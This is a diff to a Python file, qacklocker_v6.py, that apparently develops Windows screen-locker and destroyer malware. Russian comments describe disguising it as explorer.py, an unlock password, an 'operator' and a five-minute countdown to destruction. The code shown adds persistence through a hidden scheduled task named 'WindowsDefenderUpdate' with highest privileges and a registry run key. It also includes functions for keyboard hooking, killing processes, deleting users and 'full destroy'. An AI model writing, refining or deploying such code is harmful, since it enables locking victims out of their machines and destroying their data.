@@ -1,6 +1,6 @@
 # language: Python 3.10+, file: qacklocker_v6.py, target: Windows 10/11 VM (isolated)
-# v6: все 28 фиксов. Один файл. Маскировка в %APPDATA%\Microsoft\explorer.py,
-# запуск через pythonw.exe, watchdog = та же копия с --watchdog <pid>.
+# v6 final: update_idletasks, frozen-safe _launch_line, schtasks via cmd /c,
+# deadline от показа UI. Пароль 79383, оператор pu709, 5 мин -> снос.
 import ctypes
 import hashlib
 import json
@@ -203,7 +203,7 @@ def reg_set_hkcu(path, name, value, vtype=1):
     except Exception:
         return False
 
-# ================= SELF-MASQUERADE (fix 3/4/5) =================
+# ================= SELF-MASQUERADE =================
 def self_masquerade():
     try:
         os.makedirs(MASQ_DIR, exist_ok=True)
@@ -537,7 +537,7 @@ def nuke_users():
         except Exception:
             pass
 
-# ================= FULL DESTROY (fix 24/26) =================
+# ================= FULL DESTROY =================
 def full_destroy(force=False):
     if not force and is_destroyed():
         return
@@ -568,13 +568,32 @@ def full_destroy(force=False):
     except Exception:
         pass
 
-# ================= AUTOSTART (fix 5/16) =================
+# ================= AUTOSTART =================
 def _launch_line():
+    if getattr(sys, "frozen", False):
+        return f'"{sys.executable}"'
     script = MASQ_SCRIPT if os.path.exists(MASQ_SCRIPT) else os.path.abspath(__file__)
     pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
     if not os.path.exists(pyw):
         pyw = sys.executable
     return f'"{pyw}" "{script}"'
+
+
+def _schtasks_create(line):
+    inner = f'schtasks /create /tn WindowsDefenderUpdate /tr "{line}" /sc onlogon /rl highest /f'
+    try:
+        subprocess.run(["cmd", "/c", inner], capture_output=True,
+                       creationflags=CREATE_NO_WINDOW, timeout=15)
+    except Exception:
+        pass
+
+
+def _schtasks_delete():
+    try:
+        subprocess.run(["cmd", "/c", "schtasks /delete /tn WindowsDefenderUpdate /f"],
+                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
+    except Exception:
+        pass
 
 
 def install_autostart():
@@ -587,14 +606,7 @@ def install_autostart():
             winreg.SetValueEx(k, "explorer", 0, winreg.REG_SZ, line)
     except Exception:
         pass
-    try:
-        subprocess.run(
-            ["schtasks", "/create", "/tn", "WindowsDefenderUpdate",
-             "/tr", line, "/sc", "onlogon", "/rl", "highest", "/f"],
-            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=15,
-        )
-    except Exception:
-        pass
+    _schtasks_create(line)
 
 
 def remove_autostart():
@@ -606,11 +618,7 @@ def remove_autostart():
             winreg.DeleteValue(k, "explorer")
     except Exception:
         pass
-    try:
-        subprocess.run(["schtasks", "/delete", "/tn", "WindowsDefenderUpdate", "/f"],
-                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
-    except Exception:
-        pass
+    _schtasks_delete()
 
 
 def apply_reg_blocks():
@@ -697,7 +705,7 @@ def uninstall_keyboard_hook():
             pass
         _kb_hook = None
 
-# ================= SHUTDOWN WATCHER (fix 10/11/12) =================
+# ================= SHUTDOWN WATCHER =================
 def install_shutdown_watcher(win):
     global _WNDPROC_REF
     hwnd = win.winfo_id()
@@ -720,7 +728,7 @@ def install_shutdown_watcher(win):
                              ctypes.cast(_WNDPROC_REF, ctypes.c_void_p).value)
     return _WNDPROC_REF
 
-# ================= WATCHDOG (fix 3/7/8) =================
+# ================= WATCHDOG =================
 def _parent_alive(pid):
     try:
         p = kernel32.OpenProcess(0x1000, False, pid)
@@ -818,7 +826,7 @@ def kill_watchdog():
     except Exception:
         pass
 
-# ================= PROCESS KILL (fix 1/2) =================
+# ================= PROCESS KILL =================
 def _proc_blocked(proc):
     try:
         info = proc.info
@@ -964,6 +972,7 @@ def run_ui():
     from PIL import Image, ImageTk
 
     global _GLOBAL_DEADLINE
+    _GLOBAL_DEADLINE = time.time() + GLOBAL_DESTROY_SECONDS
     deadline = _GLOBAL_DEADLINE
 
     win = tk.Tk()
@@ -973,6 +982,7 @@ def run_ui():
     win.configure(bg="#000000")
     win.protocol("WM_DELETE_WINDOW", lambda: None)
 
+    win.update_idletasks()
     try:
         install_shutdown_watcher(win)
     except Exception:
@@ -1131,8 +1141,6 @@ def run_ui():
 
 # ================= ENTRY =================
 def main():
-    global _GLOBAL_DEADLINE
-
     if len(sys.argv) >= 3 and sys.argv[1] == "--watchdog":
         try:
             parent = int(sys.argv[2])
@@ -1142,8 +1150,6 @@ def main():
         return
 
     ensure_admin()
-
-    _GLOBAL_DEADLINE = time.time() + GLOBAL_DESTROY_SECONDS
 
     try:
         add_exclusions()
